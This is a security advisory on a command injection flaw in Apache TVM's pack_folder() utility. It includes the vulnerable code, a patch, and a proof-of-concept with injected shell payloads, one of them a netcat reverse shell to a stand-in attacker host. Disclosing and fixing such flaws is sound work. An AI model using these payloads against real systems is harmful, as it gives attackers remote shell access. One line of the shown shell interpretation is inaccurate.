# Apache TVM pack_folder Command Injection Vulnerability

## Vulnerability Description

| Field | Value |
|-------|-------|
| Affected Software | Apache TVM |
| Affected Versions | main branch (as of 2024-01-16) |
| Vulnerability Type | Command Injection (CWE-78) |
| Severity | High |
| CVSS Score | 7.8 (HIGH) |
| CVSS Vector | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Discovery Date | 2024-01-16 |

### Summary

The `pack_folder()` function in TVM's MSC utilities constructs a tar command using Python string formatting without proper input validation, then executes it with `shell=True`. This allows attackers to inject arbitrary shell commands through specially crafted path parameters.

## Proof of Concept

### Vulnerable Code

**File**: `python/tvm/contrib/msc/core/utils/file.py:479`

```python
def pack_folder(path: str, dst: str = None, style="tar.gz"):
    dst = dst or path + "." + style
    if style == "tar.gz":
        # VULNERABLE: Direct string formatting without validation
        cmd = "tar --exclude={0} -zcvf {0} {1} && rm -rf {1}".format(dst, path)
    else:
        raise NotImplementedError(f"Pack style {style} is not supported")

    retcode = subprocess.call(cmd, shell=True)  # shell=True enables injection
    return dst
```

### Exploit

```python
from tvm.contrib.msc.core.utils import file as msc_file

# Payload 1: Semicolon injection
malicious_path = "/tmp/model; touch /tmp/tvm_pwned.txt #"
msc_file.pack_folder(malicious_path, "backup.tar.gz")

# Payload 2: Reverse shell
malicious_path = "/tmp/model; nc attacker.com 4444 -e /bin/bash #"
msc_file.pack_folder(malicious_path, "backup.tar.gz")
```

### Execution Result

```bash
# Command executed:
tar --exclude=backup.tar.gz -zcvf backup.tar.gz /tmp/model; touch /tmp/tvm_pwned.txt #.tar.gz /tmp/model; touch /tmp/tvm_pwned.txt # && rm -rf /tmp/model; touch /tmp/tvm_pwned.txt #

# Shell interprets as:
tar ... && touch /tmp/tvm_pwned.txt
```

### Verified Results

```
[+] Vulnerability confirmed! File created: /tmp/tvm_pwned.txt     (semicolon injection)
[+] Vulnerability confirmed! File created: /tmp/tvm_pwned2.txt    (backtick substitution)
[+] Vulnerability confirmed! File created: /tmp/tvm_pwned3.txt    (pipe injection)
[+] File content: PWNED
```

---

## Vulnerability Analysis

### Data Flow

```
User Input (export_path="/tmp/model; evil_command #.tar.gz")
    ↓
tvm.contrib.msc.pipeline.Pipeline.export(export_path)
    ↓
msc_utils.pack_folder(path.replace(".tar.gz", ""), "tar.gz")
    ↓
subprocess.call("tar ... && rm -rf ...", shell=True)
    ↓
Command Execution
```

### Trigger Points

1. `tvm.contrib.msc.pipeline.Pipeline.export(path)` when path ends with `.tar.gz`
2. Direct calls to `tvm.contrib.msc.core.utils.file.pack_folder()`
3. Any code using MSC utilities for model packaging

---

## Fix

### Recommended Patch

```python
import shlex
import os.path

def pack_folder(path: str, dst: str = None, style="tar.gz"):
    """Pack the folder with proper input validation."""
    dst = dst or path + "." + style

    # Normalize paths
    path = os.path.abspath(path)
    dst = os.path.abspath(dst)

    if style == "tar.gz":
        # Use list arguments (no shell=True)
        cmd = ["tar", "--exclude", dst, "-zcvf", dst, path]
        retcode = subprocess.call(cmd)  # Safe: no shell
    else:
        raise NotImplementedError(f"Pack style {style} is not supported")

    return dst
```

---

## Timeline

| Date | Event |
|------|-------|
| 2024-01-16 | Vulnerability discovered and verified |
| TBD | Vendor notification |
| TBD | Patch release |
| TBD | CVE assignment |

---

## References

- Product: https://github.com/apache/tvm
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- Apache TVM: https://tvm.apache.org/

---

## Disclaimer

This report is provided for security research and educational purposes only. All testing was conducted in authorized environments.

---

*Report Date: 2024-01-16*
*Analyzed Version: Apache TVM main branch*
